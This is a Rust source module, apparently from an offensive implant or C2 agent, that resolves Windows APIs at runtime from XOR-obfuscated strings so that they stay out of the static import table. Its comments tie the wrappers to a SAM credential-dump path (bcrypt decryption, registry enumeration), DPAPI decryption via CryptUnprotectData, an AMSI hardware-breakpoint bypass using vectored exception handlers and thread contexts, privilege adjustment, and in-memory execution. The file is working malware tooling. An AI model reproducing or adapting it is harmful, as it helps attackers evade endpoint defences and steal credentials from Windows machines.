//! Runtime API resolution — removes suspicious imports from the static IAT.
//!
//! Pattern: resolve via GetProcAddress with XOR-obfuscated names, cache pointer
//! in AtomicUsize.  Only GetModuleHandleA and GetProcAddress stay in the IAT.

#[cfg(windows)]
use crate::sb;

#[cfg(windows)]
use std::sync::atomic::{AtomicUsize, Ordering};

#[cfg(windows)]
extern "system" {
    fn GetModuleHandleA(name: *const u8) -> *mut std::ffi::c_void;
    fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *const std::ffi::c_void;
}

/// Resolve a function from a DLL. Both `dll` and `func` must be null-terminated.
#[cfg(windows)]
unsafe fn resolve(dll: &[u8], func: &[u8]) -> *const std::ffi::c_void {
    let h = GetModuleHandleA(dll.as_ptr());
    if h.is_null() { return std::ptr::null(); }
    GetProcAddress(h, func.as_ptr())
}

/// Resolve and cache a function pointer. Thread-safe via AtomicUsize.
#[cfg(windows)]
unsafe fn cached_resolve(cache: &AtomicUsize, dll: &[u8], func: &[u8]) -> usize {
    let v = cache.load(Ordering::Relaxed);
    if v != 0 { return v; }
    let p = resolve(dll, func) as usize;
    if p != 0 { cache.store(p, Ordering::Relaxed); }
    p
}

// ── kernel32 APIs ────────────────────────────────────────────────────────────

#[cfg(windows)]
static OPEN_PROCESS: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static TERMINATE_PROCESS: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static VIRTUAL_ALLOC: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static VIRTUAL_FREE: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static VIRTUAL_PROTECT: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static MOVE_FILE_EX_W: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static LOCAL_FREE: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static CREATE_THREAD: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static WAIT_FOR_SINGLE_OBJECT: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static CLOSE_HANDLE: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
pub unsafe fn virtual_alloc(addr: *const std::ffi::c_void, size: usize, alloc_type: u32, prot: u32) -> *mut std::ffi::c_void {
    type Fn = unsafe extern "system" fn(*const std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
    let p = cached_resolve(&VIRTUAL_ALLOC, &sb!("kernel32.dll"), &sb!("VirtualAlloc"));
    if p == 0 { return std::ptr::null_mut(); }
    let f: Fn = std::mem::transmute(p);
    f(addr, size, alloc_type, prot)
}

#[cfg(windows)]
pub unsafe fn virtual_free(addr: *mut std::ffi::c_void, size: usize, free_type: u32) -> i32 {
    type Fn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
    let p = cached_resolve(&VIRTUAL_FREE, &sb!("kernel32.dll"), &sb!("VirtualFree"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(addr, size, free_type)
}

#[cfg(windows)]
pub unsafe fn create_thread(
    attrs: *mut std::ffi::c_void, stack: usize,
    start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
    param: *mut std::ffi::c_void, flags: u32, tid: *mut u32,
) -> isize {
    type Fn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32, *mut std::ffi::c_void, u32, *mut u32) -> isize;
    let p = cached_resolve(&CREATE_THREAD, &sb!("kernel32.dll"), &sb!("CreateThread"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(attrs, stack, start, param, flags, tid)
}

#[cfg(windows)]
pub unsafe fn wait_for_single_object(handle: isize, ms: u32) -> u32 {
    type Fn = unsafe extern "system" fn(isize, u32) -> u32;
    let p = cached_resolve(&WAIT_FOR_SINGLE_OBJECT, &sb!("kernel32.dll"), &sb!("WaitForSingleObject"));
    if p == 0 { return 0xFFFFFFFF; }
    let f: Fn = std::mem::transmute(p);
    f(handle, ms)
}

#[cfg(windows)]
pub unsafe fn close_handle(handle: isize) -> i32 {
    type Fn = unsafe extern "system" fn(isize) -> i32;
    let p = cached_resolve(&CLOSE_HANDLE, &sb!("kernel32.dll"), &sb!("CloseHandle"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(handle)
}

#[cfg(windows)]
pub unsafe fn open_process(access: u32, inherit: i32, pid: u32) -> isize {
    type Fn = unsafe extern "system" fn(u32, i32, u32) -> isize;
    let p = cached_resolve(&OPEN_PROCESS, &sb!("kernel32.dll"), &sb!("OpenProcess"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(access, inherit, pid)
}

#[cfg(windows)]
pub unsafe fn terminate_process(handle: isize, exit_code: u32) -> i32 {
    type Fn = unsafe extern "system" fn(isize, u32) -> i32;
    let p = cached_resolve(&TERMINATE_PROCESS, &sb!("kernel32.dll"), &sb!("TerminateProcess"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(handle, exit_code)
}

#[cfg(windows)]
pub unsafe fn virtual_protect(addr: *const std::ffi::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> i32 {
    type Fn = unsafe extern "system" fn(*const std::ffi::c_void, usize, u32, *mut u32) -> i32;
    let p = cached_resolve(&VIRTUAL_PROTECT, &sb!("kernel32.dll"), &sb!("VirtualProtect"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(addr, size, new_prot, old_prot)
}

#[cfg(windows)]
pub unsafe fn move_file_ex_w(existing: *const u16, new: *const u16, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(*const u16, *const u16, u32) -> i32;
    let p = cached_resolve(&MOVE_FILE_EX_W, &sb!("kernel32.dll"), &sb!("MoveFileExW"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(existing, new, flags)
}

#[cfg(windows)]
pub unsafe fn local_free(hmem: *mut u8) -> *mut u8 {
    type Fn = unsafe extern "system" fn(*mut u8) -> *mut u8;
    let p = cached_resolve(&LOCAL_FREE, &sb!("kernel32.dll"), &sb!("LocalFree"));
    if p == 0 { return std::ptr::null_mut(); }
    let f: Fn = std::mem::transmute(p);
    f(hmem)
}

#[cfg(windows)]
static NT_TERMINATE: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
pub unsafe fn exit_process(code: u32) -> ! {
    // Use NtTerminateProcess directly — kernel32!ExitProcess may be hooked
    // (memexec hooks it to ExitThread to protect the agent process).
    type NtTerm = unsafe extern "system" fn(isize, u32) -> i32;
    let p = cached_resolve(&NT_TERMINATE, &sb!("ntdll.dll"), &sb!("NtTerminateProcess"));
    if p != 0 {
        let f: NtTerm = std::mem::transmute(p);
        f(-1, code); // -1 = NtCurrentProcess
    }
    std::process::exit(code as i32)
}

// ── kernel32: GetProcAddress (for PE import resolution) ─────────────────────

#[cfg(windows)]
static GET_PROC_ADDRESS: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
pub unsafe fn get_proc_address(module: *mut std::ffi::c_void, name: *const u8) -> *const std::ffi::c_void {
    type Fn = unsafe extern "system" fn(*mut std::ffi::c_void, *const u8) -> *const std::ffi::c_void;
    let p = cached_resolve(&GET_PROC_ADDRESS, &sb!("kernel32.dll"), &sb!("GetProcAddress"));
    if p == 0 { return std::ptr::null(); }
    let f: Fn = std::mem::transmute(p);
    f(module, name)
}

// ── advapi32 APIs ────────────────────────────────────────────────────────────

#[cfg(windows)]
static CHECK_TOKEN_MEMBERSHIP: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static CREATE_WELL_KNOWN_SID: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
pub unsafe fn check_token_membership(token: isize, sid: *mut std::ffi::c_void, is_member: *mut i32) -> i32 {
    type Fn = unsafe extern "system" fn(isize, *mut std::ffi::c_void, *mut i32) -> i32;
    let p = cached_resolve(&CHECK_TOKEN_MEMBERSHIP, &sb!("advapi32.dll"), &sb!("CheckTokenMembership"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(token, sid, is_member)
}

#[cfg(windows)]
pub unsafe fn create_well_known_sid(sid_type: u32, domain_sid: *mut std::ffi::c_void, sid: *mut std::ffi::c_void, sid_size: *mut u32) -> i32 {
    type Fn = unsafe extern "system" fn(u32, *mut std::ffi::c_void, *mut std::ffi::c_void, *mut u32) -> i32;
    let p = cached_resolve(&CREATE_WELL_KNOWN_SID, &sb!("advapi32.dll"), &sb!("CreateWellKnownSid"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(sid_type, domain_sid, sid, sid_size)
}

// ── crypt32 APIs ─────────────────────────────────────────────────────────────

#[cfg(windows)]
static CRYPT_UNPROTECT_DATA: AtomicUsize = AtomicUsize::new(0);

/// Wrapper for CryptUnprotectData. Caller passes raw pointers to DATA_BLOB structs.
#[cfg(windows)]
pub unsafe fn crypt_unprotect_data(
    in_: *const std::ffi::c_void,
    desc: *mut *mut u16,
    entropy: *const std::ffi::c_void,
    reserved: *mut u8,
    prompt: *mut u8,
    flags: u32,
    out: *mut std::ffi::c_void,
) -> i32 {
    type Fn = unsafe extern "system" fn(*const std::ffi::c_void, *mut *mut u16, *const std::ffi::c_void, *mut u8, *mut u8, u32, *mut std::ffi::c_void) -> i32;
    let p = cached_resolve(&CRYPT_UNPROTECT_DATA, &sb!("crypt32.dll"), &sb!("CryptUnprotectData"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(in_, desc, entropy, reserved, prompt, flags, out)
}

// ── bcrypt APIs (SAM dump path) ──────────────────────────────────────────────

#[cfg(windows)]
static BCRYPT_OPEN: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_SET_PROP: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_GEN_KEY: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_DECRYPT: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_DESTROY_KEY: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_CLOSE: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_CREATE_HASH: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_HASH_DATA: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_FINISH_HASH: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static BCRYPT_DESTROY_HASH: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
fn bcrypt_dll() -> Vec<u8> { sb!("bcrypt.dll") }

#[cfg(windows)]
pub unsafe fn bcrypt_open_algorithm_provider(alg: *mut usize, id: *const u16, impl_: *const u16, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(*mut usize, *const u16, *const u16, u32) -> i32;
    let p = cached_resolve(&BCRYPT_OPEN, &bcrypt_dll(), &sb!("BCryptOpenAlgorithmProvider"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(alg, id, impl_, flags)
}

#[cfg(windows)]
pub unsafe fn bcrypt_set_property(obj: usize, prop: *const u16, val: *const u8, val_len: u32, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(usize, *const u16, *const u8, u32, u32) -> i32;
    let p = cached_resolve(&BCRYPT_SET_PROP, &bcrypt_dll(), &sb!("BCryptSetProperty"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(obj, prop, val, val_len, flags)
}

#[cfg(windows)]
pub unsafe fn bcrypt_generate_symmetric_key(alg: usize, key_h: *mut usize, obj: *mut u8, obj_len: u32, secret: *const u8, secret_len: u32, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(usize, *mut usize, *mut u8, u32, *const u8, u32, u32) -> i32;
    let p = cached_resolve(&BCRYPT_GEN_KEY, &bcrypt_dll(), &sb!("BCryptGenerateSymmetricKey"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(alg, key_h, obj, obj_len, secret, secret_len, flags)
}

#[cfg(windows)]
pub unsafe fn bcrypt_decrypt(key: usize, input: *const u8, input_len: u32, pad_info: *const u8, iv: *mut u8, iv_len: u32, output: *mut u8, output_len: u32, result: *mut u32, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(usize, *const u8, u32, *const u8, *mut u8, u32, *mut u8, u32, *mut u32, u32) -> i32;
    let p = cached_resolve(&BCRYPT_DECRYPT, &bcrypt_dll(), &sb!("BCryptDecrypt"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(key, input, input_len, pad_info, iv, iv_len, output, output_len, result, flags)
}

#[cfg(windows)]
pub unsafe fn bcrypt_destroy_key(key: usize) -> i32 {
    type Fn = unsafe extern "system" fn(usize) -> i32;
    let p = cached_resolve(&BCRYPT_DESTROY_KEY, &bcrypt_dll(), &sb!("BCryptDestroyKey"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(key)
}

#[cfg(windows)]
pub unsafe fn bcrypt_close_algorithm_provider(alg: usize, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(usize, u32) -> i32;
    let p = cached_resolve(&BCRYPT_CLOSE, &bcrypt_dll(), &sb!("BCryptCloseAlgorithmProvider"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(alg, flags)
}

#[cfg(windows)]
pub unsafe fn bcrypt_create_hash(alg: usize, hash: *mut usize, obj: *mut u8, obj_len: u32, secret: *const u8, secret_len: u32, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(usize, *mut usize, *mut u8, u32, *const u8, u32, u32) -> i32;
    let p = cached_resolve(&BCRYPT_CREATE_HASH, &bcrypt_dll(), &sb!("BCryptCreateHash"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(alg, hash, obj, obj_len, secret, secret_len, flags)
}

#[cfg(windows)]
pub unsafe fn bcrypt_hash_data(hash: usize, data: *const u8, data_len: u32, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(usize, *const u8, u32, u32) -> i32;
    let p = cached_resolve(&BCRYPT_HASH_DATA, &bcrypt_dll(), &sb!("BCryptHashData"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(hash, data, data_len, flags)
}

#[cfg(windows)]
pub unsafe fn bcrypt_finish_hash(hash: usize, output: *mut u8, output_len: u32, flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(usize, *mut u8, u32, u32) -> i32;
    let p = cached_resolve(&BCRYPT_FINISH_HASH, &bcrypt_dll(), &sb!("BCryptFinishHash"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(hash, output, output_len, flags)
}

#[cfg(windows)]
pub unsafe fn bcrypt_destroy_hash(hash: usize) -> i32 {
    type Fn = unsafe extern "system" fn(usize) -> i32;
    let p = cached_resolve(&BCRYPT_DESTROY_HASH, &bcrypt_dll(), &sb!("BCryptDestroyHash"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(hash)
}

// ── kernel32: LoadLibraryA ──────────────────────────────────────────────────

#[cfg(windows)]
static LOAD_LIBRARY_A: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
pub unsafe fn load_library_a(name: *const u8) -> isize {
    type Fn = unsafe extern "system" fn(*const u8) -> isize;
    let p = cached_resolve(&LOAD_LIBRARY_A, &sb!("kernel32.dll"), &sb!("LoadLibraryA"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(name)
}

// ── advapi32: Registry APIs ─────────────────────────────────────────────────

#[cfg(windows)]
static REG_OPEN_KEY_EX_W: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static REG_CLOSE_KEY: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static REG_QUERY_INFO_KEY_W: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static REG_ENUM_KEY_EX_W: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static REG_QUERY_MULTIPLE_VALUES_W: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
pub unsafe fn reg_open_key_ex_w(key: isize, sub: *const u16, opts: u32, sam: u32, result: *mut isize) -> i32 {
    type Fn = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
    let p = cached_resolve(&REG_OPEN_KEY_EX_W, &sb!("advapi32.dll"), &sb!("RegOpenKeyExW"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(key, sub, opts, sam, result)
}

#[cfg(windows)]
pub unsafe fn reg_close_key(key: isize) -> i32 {
    type Fn = unsafe extern "system" fn(isize) -> i32;
    let p = cached_resolve(&REG_CLOSE_KEY, &sb!("advapi32.dll"), &sb!("RegCloseKey"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(key)
}

#[cfg(windows)]
pub unsafe fn reg_query_info_key_w(
    key: isize, class: *mut u16, class_len: *mut u32,
    reserved: *mut u32, sub_keys: *mut u32, max_sub: *mut u32,
    max_class: *mut u32, values: *mut u32, max_val_name: *mut u32,
    max_val_data: *mut u32, sec: *mut u32, last_write: *mut u64,
) -> i32 {
    type Fn = unsafe extern "system" fn(isize, *mut u16, *mut u32, *mut u32, *mut u32, *mut u32, *mut u32, *mut u32, *mut u32, *mut u32, *mut u32, *mut u64) -> i32;
    let p = cached_resolve(&REG_QUERY_INFO_KEY_W, &sb!("advapi32.dll"), &sb!("RegQueryInfoKeyW"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(key, class, class_len, reserved, sub_keys, max_sub, max_class, values, max_val_name, max_val_data, sec, last_write)
}

#[cfg(windows)]
pub unsafe fn reg_enum_key_ex_w(
    key: isize, idx: u32, name: *mut u16, name_len: *mut u32,
    reserved: *mut u32, class: *mut u16, class_len: *mut u32,
    last_write: *mut u64,
) -> i32 {
    type Fn = unsafe extern "system" fn(isize, u32, *mut u16, *mut u32, *mut u32, *mut u16, *mut u32, *mut u64) -> i32;
    let p = cached_resolve(&REG_ENUM_KEY_EX_W, &sb!("advapi32.dll"), &sb!("RegEnumKeyExW"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(key, idx, name, name_len, reserved, class, class_len, last_write)
}

#[cfg(windows)]
pub unsafe fn reg_query_multiple_values_w(key: isize, list: *mut u8, num: u32, buf: *mut u8, buf_size: *mut u32) -> i32 {
    type Fn = unsafe extern "system" fn(isize, *mut u8, u32, *mut u8, *mut u32) -> i32;
    let p = cached_resolve(&REG_QUERY_MULTIPLE_VALUES_W, &sb!("advapi32.dll"), &sb!("RegQueryMultipleValuesW"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(key, list, num, buf, buf_size)
}

// ── kernel32: VEH + Thread Context (for AMSI HW breakpoint bypass) ─────────

#[cfg(windows)]
static ADD_VEH: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static REMOVE_VEH: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static GET_THREAD_CTX: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static SET_THREAD_CTX: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
pub unsafe fn add_vectored_exception_handler(
    first: u32,
    handler: unsafe extern "system" fn(*mut u8) -> i32,
) -> *mut std::ffi::c_void {
    type Fn = unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut u8) -> i32) -> *mut std::ffi::c_void;
    let p = cached_resolve(&ADD_VEH, &sb!("kernel32.dll"), &sb!("AddVectoredExceptionHandler"));
    if p == 0 { return std::ptr::null_mut(); }
    let f: Fn = std::mem::transmute(p);
    f(first, handler)
}

#[cfg(windows)]
pub unsafe fn remove_vectored_exception_handler(handle: *mut std::ffi::c_void) -> u32 {
    type Fn = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;
    let p = cached_resolve(&REMOVE_VEH, &sb!("kernel32.dll"), &sb!("RemoveVectoredExceptionHandler"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(handle)
}

#[cfg(windows)]
pub unsafe fn get_thread_context(thread: isize, context: *mut u8) -> i32 {
    type Fn = unsafe extern "system" fn(isize, *mut u8) -> i32;
    let p = cached_resolve(&GET_THREAD_CTX, &sb!("kernel32.dll"), &sb!("GetThreadContext"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(thread, context)
}

#[cfg(windows)]
pub unsafe fn set_thread_context(thread: isize, context: *const u8) -> i32 {
    type Fn = unsafe extern "system" fn(isize, *const u8) -> i32;
    let p = cached_resolve(&SET_THREAD_CTX, &sb!("kernel32.dll"), &sb!("SetThreadContext"));
    if p == 0 { return 0; }
    let f: Fn = std::mem::transmute(p);
    f(thread, context)
}

// ── ntdll: RtlAdjustPrivilege ───────────────────────────────────────────────

#[cfg(windows)]
static RTL_ADJUST_PRIVILEGE: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
pub unsafe fn rtl_adjust_privilege(privilege: u32, enable: u8, current_thread: u8, was_enabled: *mut u8) -> i32 {
    type Fn = unsafe extern "system" fn(u32, u8, u8, *mut u8) -> i32;
    let p = cached_resolve(&RTL_ADJUST_PRIVILEGE, &sb!("ntdll.dll"), &sb!("RtlAdjustPrivilege"));
    if p == 0 { return -1; }
    let f: Fn = std::mem::transmute(p);
    f(privilege, enable, current_thread, was_enabled)
}
